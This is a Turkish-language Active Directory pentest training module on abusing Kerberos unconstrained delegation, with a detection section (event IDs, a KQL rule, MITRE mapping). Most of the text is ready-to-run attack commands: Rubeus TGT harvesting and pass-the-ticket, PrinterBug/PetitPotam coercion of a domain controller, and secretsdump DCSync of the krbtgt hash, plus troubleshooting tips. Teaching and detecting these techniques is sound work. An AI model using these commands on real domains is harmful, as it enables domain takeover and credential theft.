## 1. Genel Bakış ve Mimari İşleyiş

Kerberos Delegasyonu, çok katmanlı kurumsal mimarilerde (örneğin Web Sunucusu ──▶ Veritabanı Sunucusu) bir ön uç servisinin oturum açmış kullanıcı adına arka uçtaki kaynaklara erişebilmesini sağlamak amacıyla tasarlanmıştır.

Bu mimarinin en eski ve en tehlikeli türü **Unconstrained (Kısıtlanmamış) Delegation**'dır:
- Active Directory'de bir bilgisayar veya kullanıcı hesabının `userAccountControl` özniteliğinde `TRUSTED_FOR_DELEGATION (0x80000)` bayrağı aktif edildiğinde, bu makineye bağlanan her kullanıcının **TGT (Ticket Granting Ticket) biletinin iletilebilir (Forwardable) bir kopyası** hedef makinenin LSASS belleğine teslim edilir.
- Saldırgan unconstrained bir makinede yerel yönetici (Local Administrator / SYSTEM) yetkisine sahip olduğunda, belleğe düşen tüm TGT biletlerini (Domain Admin ve Domain Controller makine hesapları dahil) hasat edebilir.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 UNCONSTRAINED DELEGATION VE TGT HASADI AKIŞI                │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
           [1. İstemcinin Unconstrained Makineye (WEB01) Erişimi]
           - İstemci KDC'den WEB01 için Service Ticket (TGS) talep eder
           - KDC, WEB01'in TRUSTED_FOR_DELEGATION olduğunu görür
           - KDC, Service Ticket içerisine kullanıcının FORWARDABLE TGT'sini gömer
                                      │
                                      ▼
           [2. TGT'nin WEB01 LSASS Belleğine Yerleşmesi]
           - İstemci bileti WEB01'e sunar; WEB01 kullanıcının TGT'sini LSASS'a kaydeder
           - Saldırgan WEB01 üzerinde Rubeus monitor veya Mimikatz çalıştırır
                                      │
                                      ▼
           [3. Aktif Koersiyon (Zorlamalı Kimlik Doğrulama - Modül 08)]
           - Saldırgan Kali'den PrinterBug (MS-RPRN) veya PetitPotam tetikler
           - Domain Controller (DC01$), WEB01'e SMB üzerinden bağlanmaya zorlanır
           - DC01$ makine hesabının TGT'si WEB01 LSASS belleğine düşer!
                                      │
                                      ▼
           [4. Hasat Edilen Bilet ile DCSync ve Domain Hakimiyeti]
           - Rubeus /ptt ile DC01$ TGT'si geçerli oturuma enjekte edilir
           - DC01$ kimliğiyle secretsdump çalıştırılarak krbtgt hash'i çekilir (Modül 09)
```

### 1.1 Kritik Bayraklar ve Koruma Seviyeleri

| Bileşen / Bayrak | Değer / Konum | Anlamı ve Operasyonel Etki |
|---|---|---|
| **TRUSTED_FOR_DELEGATION** | `0x00080000` (UAC) | Hesabın unconstrained delegation yetkisine sahip olduğunu belirtir (KDC TGT'yi bilete ekler). |
| **FORWARDABLE / FORWARDED** | Kerberos Flag | Biletin başka bir servise aktarılabileceğini gösterir. |
| **NOT_DELEGATED** | `0x00100000` (UAC) | "Account is sensitive and cannot be delegated": Bu hesapların TGT'si asla iletilmez. |
| **Protected Users Grubu** | RID `525` | Bu gruba üye hesapların TGT'si delegasyona uğramaz; AES zorunludur; bilet süresi 4 saat ile sınırlıdır. |

## 2. Derinlemesine Teknik Mekanizmalar

### 2.1 Pasif Hasat vs. Aktif Koersiyon
1. **Pasif Hasat (Rubeus Monitor):** Unconstrained makinede arka planda bir dinleyici (`Rubeus monitor /interval:5`) çalıştırılır. Sistem yöneticileri rutin bakım veya RDP/SMB işlemleri için bu sunucuya bağlandığında TGT'leri otomatik olarak yakalanır.
2. **Aktif Koersiyon (PrinterBug / PetitPotam):** Pasif beklemek yerine, bir Domain Controller makinesi RPC çağrılarıyla unconstrained sunucuya geri bağlanmaya zorlanır. Bu sayede dakikalar içinde `DC01$` makine hesabının TGT'si elde edilir.

### 2.2 DC01$ Makine Hesabının Gücü ve DCSync
Bir Domain Controller'ın makine hesabı (`DC01$`), Active Directory şemasında en yüksek ayrıcalığa sahip nesnelerden biridir:
- Dizin replikasyon haklarına (`DS-Replication-Get-Changes-All`) doğası gereği sahiptir.
- Dolayısıyla `DC01$` TGT'si ele geçirildiğinde, başka hiçbir kullanıcı parolası bilmeksizin doğrudan **DCSync ([09.1](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/09.1_DCSync_Saldirisi_ve_Mimikatz.md))** çalıştırılabilir ve tüm etki alanının `krbtgt` dahil tüm parola özetleri dökülebilir.

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: Active Directory'de Unconstrained Sistemleri Keşfetme
```powershell
# PowerView ile etki alanında unconstrained delegation tanımlı bilgisayarları listele (DC'ler hariç)
Get-DomainComputer -Unconstrained | ? { $_.samaccountname -notmatch 'DC' } | Select samaccountname, dnshostname, operatingsystem
```
```bash
# Linux üzerinden NetExec ile tarama
nxc ldap 10.10.10.5 -u jdoe -p 'Welcome123!' --trusted-for-delegation
```

### Senaryo 2: Rubeus ile Pasif TGT Hasadı ve Belleğe Enjeksiyon
```cmd
:: Unconstrained makinede yönetici komut satırında DC01$ için TGT izlemeyi başlat
Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap

:: Yakalanan bilet Base64 çıktısını doğrudan oturuma enjekte et
Rubeus.exe ptt /ticket:doIFqjCCBaagAwIBBaEDAgEWooEEUzCCBE9hggRLMIIEQ6ADAgEFoQ...
```

### Senaryo 3: Aktif Zorlama (SpoolSample / PrinterBug ile DC'yi Tetikleme)
```bash
# Kali makinesinden DC01'i unconstrained WEB01 sunucusuna bağlanmaya zorla
printerbug.py 'corp.local/jdoe:Welcome123!'@10.10.10.5 WEB01.corp.local

# Veya PetitPotam ile tetikle
petitpotam.py -u jdoe -p 'Welcome123!' -d corp.local WEB01.corp.local 10.10.10.5
```

### Senaryo 4: krbrelayx ile Birleşik Hasat (Linux Üzerinde Bilet Yakalama)
```bash
# Hedef makinenin NT hash'i biliniyorsa doğrudan gelen Kerberos trafiğini dinleyip biletleri çözme
krbrelayx.py -hashes :28f98e0c5e63078b8474ba0c4d5d7476
```

### Senaryo 5: Yakalanan DC01$ Biletini Kullanarak DCSync İcrası
```bash
# Bilet dosyasını ortam değişkenine ata ve secretsdump ile krbtgt hash'ini dök
export KRB5CCNAME=DC01$.ccache
impacket-secretsdump -k -no-pass corp.local/'DC01$'@10.10.10.5 -just-dc-user krbtgt
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `No TGT received in LSASS (Monitor boş)` | Hedef kullanıcı "Account is sensitive and cannot be delegated" işaretli veya `Protected Users` grubunda. | Korumasız servis hesaplarını veya makine hesaplarını (DC$) hedefleyin; korunan hesapların TGT'si forward edilemez. |
| `RPC Fault: 0x6ba (RPC Server Unavailable)` | PrinterBug veya PetitPotam çağrısı hedef DC'nin güvenlik duvarına takıldı veya Print Spooler servisi kapalı. | DC üzerinde Spooler servisini kontrol edin (`spoolsv.exe`). Kapalıysa PetitPotam (EFSR) veya DFSCoerce deneyin. |
| `KRB_AP_ERR_MODIFIED (Checksum error)` | İstemci ile sunucu arasındaki SPN çözümlemesinde DNS uyuşmazlığı var veya makine adı IP yerine FQDN ile girilmedi. | Koersiyon komutunda hedef ve dinleyici adreslerini IP yerine kesinlikle tam etki alanı adıyla (FQDN: `web01.corp.local`) verin. |
| `KDC_ERR_BADOPTION (Forwardable ticket not allowed)` | Etki alanı güven ilişkisinde (Forest Trust) SID Filtering veya TGT Delegation devre dışı bırakılmış. | Forest sınırları yerine etki alanı içi (intra-domain) unconstrained makineleri hedefleyin. |
| `DCSync Access Denied with captured TGT` | Yakalanan TGT sıradan bir kullanıcıya ait ve dizin replikasyon haklarına (`DS-Replication`) sahip değil. | DCSync için mutlaka Domain Controller makine hesabı (`DC01$`) veya Domain Admin bileti yakalanmalıdır. |
| `LSA Ticket Injection Failure (0xc0000022)` | Rubeus `/ptt` çağrısı yerel EDR veya LSA koruması (RunAsPPL) tarafından engellendi. | Bilet dosyasını Linux ortamına aktarın (`ticketConverter.py`) ve Impacket üzerinden uzaktan Kerberos ile kullanın. |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Event ID 4769 (Kerberos Servis Bileti İstendi):** `Ticket Options: 0x40810000` (Forwardable bilet talebi).
- **Event ID 4624 (Logon Type 3 - Network):** Domain Controller'ın bir iş istasyonuna veya web sunucusuna beklenmedik SMB kimlik doğrulaması gerçekleştirmesi.
- **Sysmon Event ID 10 (Process Access):** LSASS sürecine yönelik bellek okuma girişimleri (`GrantedAccess: 0x1FFFFF` veya `0x1010`).
- **Event ID 4662 (Dizin Nesnesi İşlemi):** DC olmayan bir IP/makine üzerinden `DS-Replication-Get-Changes-All` (DCSync) izni denetimi.

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: Domain Controller Makine Hesabının Ağ İçindeki Sunuculara Doğrulama Yapması (Koersiyon Tespiti)
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where TargetUserName endswith "$" and TargetUserName startswith "DC"
| where Computer !has "DC" // DC'den DC'ye olmayan anormal kimlik doğrulama
| project TimeGenerated, SourceComputer = WorkstationName, TargetAccount = TargetUserName, DestComputer = Computer, IpAddress
```

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Operasyonel Kullanım Aşaması |
|---|---|---|
| **T1558** | Steal or Forge Kerberos Tickets | Bellekten iletilen TGT biletlerinin hasat edilmesi. |
| **T1187** | Forced Authentication | PrinterBug / PetitPotam ile DC'nin kimlik doğrulamaya zorlanması. |
| **T1003.006** | OS Credential Dumping: DCSync | Ele geçirilen DC$ bilet ile NTDS veritabanının replike edilmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Makine hesabı kimliğiyle yetkili işlemler yürütülmesi. |

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: PowerView ile Unconstrained Bilgisayarları Bulma
```powershell
Get-DomainComputer -Unconstrained | ? { $_.samaccountname -notmatch 'DC' } | Select samaccountname, dnshostname
```
- **Ne Yapar?** Etki alanındaki Domain Controller'lar haricinde `TRUSTED_FOR_DELEGATION` bayrağı taşıyan tüm bilgisayarları listeler.
- **Ne Zaman Kullanılır?** İlk erişim sonrası yetki yükseltme ve TGT hasadı yapılabilecek zayıf sistemleri belirlemek için.
- **Parametreler:** `-Unconstrained`: Unconstrained bayrağını sorgular; `-notmatch 'DC'`: DC gürültüsünü filtreler.

### Komut 2: Rubeus ile Arka Planda TGT İzleme (Monitor)
```cmd
Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
```
- **Ne Yapar?** Unconstrained makinede her 5 saniyede bir LSASS belleğini tarayarak `DC01$` adına düşen TGT biletini yakalar.
- **Ne Zaman Kullanılır?** Koersiyon tetiklemeden önce veya pasif admin bağlantılarını beklerken.
- **Parametreler:** `/interval:5`: Tarama sıklığı (saniye); `/filteruser`: Yalnızca hedeflenen kullanıcıyı izler; `/nowrap`: Tek satır Base64 çıktı.

### Komut 3: PrinterBug (MS-RPRN) ile DC'yi Koersiyona Zorlama
```bash
printerbug.py 'corp.local/jdoe:Welcome123!'@10.10.10.5 WEB01.corp.local
```
- **Ne Yapar?** DC'nin Print Spooler servisini tetikleyerek `WEB01` sunucusuna makine kimliğiyle geri SMB bağlantısı açmasını sağlar.
- **Ne Zaman Kullanılır?** Unconstrained makinede dinleyici açıkken DC TGT'sini zorla getirtmek için.
- **Parametreler:** `@10.10.10.5`: Hedef DC adresi; `WEB01.corp.local`: Dinleyicinin FQDN adresi.

### Komut 4: PetitPotam (MS-EFSRPC) ile Koersiyon Tetikleme
```bash
petitpotam.py -u jdoe -p 'Welcome123!' -d corp.local WEB01.corp.local 10.10.10.5
```
- **Ne Yapar?** Encrypting File System RPC çağrısı üzerinden DC'yi saldırganın unconstrained sunucusuna yönlendirir.
- **Ne Zaman Kullanılır?** DC üzerinde Print Spooler kapalıysa alternatif koersiyon kanalı olarak.
- **Parametreler:** `-u / -p`: Geçerli etki alanı hesabı; `WEB01.corp.local`: Gidilecek hedef; `10.10.10.5`: Tetiklenen DC.

### Komut 5: Rubeus ile Yakalanan Bileti Belleğe Enjekte Etme (Pass-the-Ticket)
```cmd
Rubeus.exe ptt /ticket:<BASE64_TGT_OUTPUT>
```
- **Ne Yapar?** Yakalanan Kerberos biletini mevcut oturumun LSA önbelleğine yükler.
- **Ne Zaman Kullanılır?** Ele geçirilen TGT kimliğiyle (örneğin DC01$) yeni komutlar çalıştırmadan önce.
- **Parametreler:** `/ticket`: Base64 formatındaki Kerberos kirbi bileti.

### Komut 6: Çalınan Bilet ile secretsdump Üzerinden DCSync İcrası
```bash
export KRB5CCNAME=dc01.ccache && impacket-secretsdump -k -no-pass corp.local/'DC01$'@10.10.10.5 -just-dc-user krbtgt
```
- **Ne Yapar?** Yakalanan DC makine hesabı biletiyle etki alanının kalbi olan `krbtgt` hesabının NT hash'ini dökümler.
- **Ne Zaman Kullanılır?** Unconstrained delegation sömürüsünü nihai domain yönetimine (Golden Ticket) dönüştürmek için.
- **Parametreler:** `-k`: Kerberos kimlik doğrulaması; `-no-pass`: Parola sorma; `-just-dc-user`: Sadece belirtilen hesabı çek.
